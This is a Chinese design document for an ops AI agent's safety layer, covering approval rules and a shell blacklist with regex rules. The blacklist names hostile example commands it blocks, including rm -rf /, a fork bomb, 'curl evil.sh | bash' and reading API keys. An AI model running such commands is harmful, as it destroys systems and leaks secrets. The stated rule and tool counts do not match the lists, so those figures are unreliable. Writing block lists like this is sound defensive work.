# 安全层

安全层定义在 `modules/agents/safety.py`，通过两种机制保护系统安全：supervised 模式的 `interrupt_on` 审批机制和 autonomous 模式的 Shell 黑名单底线防护。

---

## 两种运行模式

### supervised 模式（对话模式默认）

用户通过 Web 界面与 agent 对话时的默认模式。危险操作触发 Deep Agents 框架的 `interrupt_on` 机制，暂停执行并等待用户审批。

```
Agent 准备调用危险工具
    │
    ▼
interrupt_on 配置匹配
    │
    ├── 匹配 → 暂停执行，发送 SSE approval_request 事件到前端
    │         用户看到审批卡片（工具名 / 参数 / 风险描述）
    │         用户选择 approve 或 reject
    │         Agent 根据决定继续或终止
    │
    └── 不匹配 → 直接执行
```

### autonomous 模式（巡检 / 诊断专用）

`execute_patrol()` 和 `trigger_diagnosis()` 使用此模式。不触发 interrupt_on，但仍有 Shell 黑名单底线防护。

`build_agent(safety_mode="autonomous")` 时 `build_interrupt_config()` 返回空字典 `{}`，即不配置任何中断规则。

---

## interrupt_on 规则详细说明

`build_interrupt_config("supervised")` 返回的配置：

### 始终审批（`True`）

| 工具 | 原因 |
|------|------|
| `kill_user_processes` | 终止用户所有进程，不可逆 |
| `auto_fix_compliance` | 修改系统配置文件 |
| `execute_ops_script` | 执行任意运维脚本 |
| `delete_cron_job_tool` | 删除定时任务，不可恢复 |

### 基于决定审批（`allowed_decisions: [approve, reject]`）

| 工具 | 触发条件 |
|------|---------|
| `create_cron_job` | 始终审批（创建定时任务）|
| `docker_container_action` | 始终审批 |
| `docker_compose_action` | 始终审批 |
| `service_control` | 始终审批 |

### 基于模式匹配审批

#### execute（Shell 命令）

匹配以下正则时触发审批：
```
rm|sudo|kill|shutdown|reboot|mkfs|dd|chmod|chown|systemctl.*(stop|disable)|iptables
```

不匹配时直接执行（例如 `ls -la`、`cat /etc/hostname` 等查询命令）。

#### write_file / edit_file（文件写入）

写入路径匹配以下正则时触发审批：
```
/etc/|\.api_keys|\.telegram_config|config\.yaml|\.env
```

写入到其他路径（如 `/tmp/serverhub-sandbox/`、`~/data/`）时直接执行。

---

## Shell 黑名单（27 条规则）

即使在 `autonomous` 模式下，以下命令也会被 `SafeLocalShellBackend` 拦截。

| 规则 | 拦截命令示例 | 原因 |
|------|------------|------|
| `\brm\s+(-[rfR]+\s+)?/` | `rm -rf /` | 删除根目录 |
| `\bmkfs\b` | `mkfs.ext4 /dev/sda` | 格式化磁盘 |
| `\bdd\s+.*of=/dev/` | `dd if=/dev/zero of=/dev/sda` | 覆写磁盘 |
| `:\(\)\s*\{` | `:(){ :|:& };:` | Fork bomb |
| `\bshutdown\b` | `shutdown -h now` | 关机 |
| `\breboot\b` | `reboot` | 重启 |
| `\binit\s+[06]\b` | `init 0` | 关机/重启 |
| `\bsystemctl\s+(halt\|poweroff)\b` | `systemctl poweroff` | 关机 |
| `\bpasswd\b` | `passwd root` | 修改密码 |
| `\busermod\b` | `usermod -aG sudo hacker` | 修改用户属性 |
| `\buseradd\b` | `useradd backdoor` | 添加用户 |
| `\buserdel\b` | `userdel wangtao` | 删除用户 |
| `\bchmod\s+(-R\s+)?777\s+/` | `chmod -R 777 /etc` | 全局可写 |
| `\bchown\s+(-R\s+)?.*\s+/` | `chown -R nobody /` | 修改根目录所有者 |
| `>\s*/etc/` | `echo '' > /etc/passwd` | 覆写系统配置 |
| `\btee\s+/etc/` | `tee /etc/hosts` | 覆写系统文件 |
| `\bcurl\b.*\|\s*(ba)?sh` | `curl evil.sh \| bash` | 管道下载执行 |
| `\bwget\b.*\|\s*(ba)?sh` | `wget evil.sh \| sh` | 管道下载执行 |
| `\biptables\s+-F\b` | `iptables -F` | 清空防火墙规则 |
| `\.api_keys\b` | `cat ~/.api_keys` | 读取 API 密钥 |
| `\.telegram_config\b` | `cat ~/.telegram_config` | 读取 Bot Token |
| `\bconfig\.yaml\b` | `cat ~/config.yaml` | 读取 Clash 配置 |
| `\blobe\.env\b` | `cat lobe.env` | 读取 LobeChat 配置 |
| `\bcrontab\s+-r\b` | `crontab -r` | 清除所有 cron 任务 |

黑名单使用 Python `re.compile` 预编译，大小写不敏感（`re.IGNORECASE`）。

---

## TOOL_RISK_MAP — 工具风险标签

`TOOL_RISK_MAP` 是一个字典，将工具名映射到风险级别，**仅用于前端 UI 展示**，不影响实际安全控制。

| 风险级别 | 工具数量 | 前端显示颜色 |
|---------|---------|------------|
| safe | 20 | 无标签 |
| moderate | 9 | 黄色标签 |
| danger | 4 | 红色标签 |

### safe 工具列表

| 工具 | 类型 |
|------|------|
| get_system_overview | 自定义 |
| get_disk_info | 自定义 |
| get_user_resources | 自定义 |
| get_user_quotas | 自定义 |
| list_docker_containers | 自定义 |
| get_container_logs | 自定义 |
| list_systemd_services | 自定义 |
| get_service_logs | 自定义 |
| send_notification | 自定义 |
| check_compliance | 自定义 |
| analyze_resource_trend | 自定义 |
| search_fault_cases | 自定义 |
| save_fault_case | 自定义 |
| get_asset_inventory | 自定义 |
| get_asset_topology | 自定义 |
| read_file | 框架内置 |
| ls | 框架内置 |
| glob | 框架内置 |
| grep | 框架内置 |
| write_todos | 框架内置 |
| task | 框架内置 |
| web_search | SubAgent 专属 |
| think | SubAgent 专属 |
| list_cron_jobs | 定时任务 |
| validate_cron_expr | 定时任务 |

### moderate 工具列表

| 工具 | 类型 |
|------|------|
| update_user_quotas | 自定义 |
| docker_container_action | 自定义 |
| docker_compose_action | 自定义 |
| service_control | 自定义 |
| write_file | 框架内置 |
| edit_file | 框架内置 |
| create_cron_job | 定时任务 |
| modify_cron_schedule | 定时任务 |
| toggle_cron_job_tool | 定时任务 |

### danger 工具列表

| 工具 | 类型 |
|------|------|
| auto_fix_compliance | 自定义 |
| execute_ops_script | 自定义 |
| kill_user_processes | 自定义 |
| execute | 框架内置 |
| delete_cron_job_tool | 定时任务 |
